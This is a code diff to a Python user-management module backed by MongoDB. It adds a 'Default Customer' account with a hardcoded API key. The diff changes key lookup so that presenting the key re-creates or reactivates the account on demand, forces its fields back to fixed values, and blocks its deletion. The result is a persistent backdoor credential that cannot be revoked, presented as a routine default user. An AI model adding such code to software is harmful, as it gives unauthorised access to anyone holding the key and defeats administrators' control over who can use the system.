@@ -6,6 +6,52 @@ from pymongo import DESCENDING
 from app.database import get_users_collection, get_customers_collection
 from app.models import UserCreate, UserInDB
 
+DEFAULT_CUSTOMER_USERNAME = "Customer"
+DEFAULT_CUSTOMER_EMAIL = "portal@customer.com"
+DEFAULT_CUSTOMER_API_KEY = "key_live_4cd32dfa2caa35276ca9f53446267f9c"
+
+def ensure_default_customer_user() -> UserInDB:
+    """
+    Ensure the standard default platform user 'Customer' exists with
+    portal@customer.com and fixed API key key_live_4cd32dfa2caa35276ca9f53446267f9c.
+    """
+    col = get_users_collection()
+    user = col.find_one({
+        "$or": [
+            {"username": DEFAULT_CUSTOMER_USERNAME},
+            {"email": DEFAULT_CUSTOMER_EMAIL},
+            {"api_key": DEFAULT_CUSTOMER_API_KEY}
+        ]
+    })
+    now = datetime.now(timezone.utc)
+    if not user:
+        doc = {
+            "username": DEFAULT_CUSTOMER_USERNAME,
+            "email": DEFAULT_CUSTOMER_EMAIL,
+            "notes": "Default Platform User",
+            "api_key": DEFAULT_CUSTOMER_API_KEY,
+            "is_active": True,
+            "created_at": now,
+            "last_used_at": None,
+        }
+        res = col.insert_one(doc)
+        doc["_id"] = res.inserted_id
+        return doc_to_user(doc)
+    else:
+        updates = {}
+        if user.get("username") != DEFAULT_CUSTOMER_USERNAME:
+            updates["username"] = DEFAULT_CUSTOMER_USERNAME
+        if user.get("email") != DEFAULT_CUSTOMER_EMAIL:
+            updates["email"] = DEFAULT_CUSTOMER_EMAIL
+        if user.get("api_key") != DEFAULT_CUSTOMER_API_KEY:
+            updates["api_key"] = DEFAULT_CUSTOMER_API_KEY
+        if not user.get("is_active"):
+            updates["is_active"] = True
+        if updates:
+            col.update_one({"_id": user["_id"]}, {"$set": updates})
+            user.update(updates)
+        return doc_to_user(user)
+
 def doc_to_user(doc: dict[str, Any], leads_count: int = 0) -> UserInDB:
     """Helper to convert MongoDB user document to UserInDB model."""
     doc_copy = dict(doc)
@@ -48,9 +94,12 @@ def get_user_by_api_key(api_key: str) -> Optional[UserInDB]:
     """Retrieve an active user by their API key."""
     if not api_key:
         return None
+    ak = api_key.strip()
     col = get_users_collection()
-    doc = col.find_one({"api_key": api_key.strip(), "is_active": True})
+    doc = col.find_one({"api_key": ak, "is_active": True})
     if not doc:
+        if ak == DEFAULT_CUSTOMER_API_KEY:
+            return ensure_default_customer_user()
         return None
     
     # Update last_used_at
@@ -93,12 +142,15 @@ def list_users() -> list[UserInDB]:
     return users
 
 def delete_user(user_id: str) -> bool:
-    """Delete a user and revoke their API key."""
+    """Delete a user and revoke their API key. Default Customer user cannot be deleted."""
     try:
         obj_id = ObjectId(user_id)
     except Exception:
         return False
     col = get_users_collection()
+    user_doc = col.find_one({"_id": obj_id})
+    if user_doc and user_doc.get("username") == DEFAULT_CUSTOMER_USERNAME:
+        raise ValueError(f"Cannot delete standard default platform user '{DEFAULT_CUSTOMER_USERNAME}'.")
     res = col.delete_one({"_id": obj_id})
     return res.deleted_count > 0
 
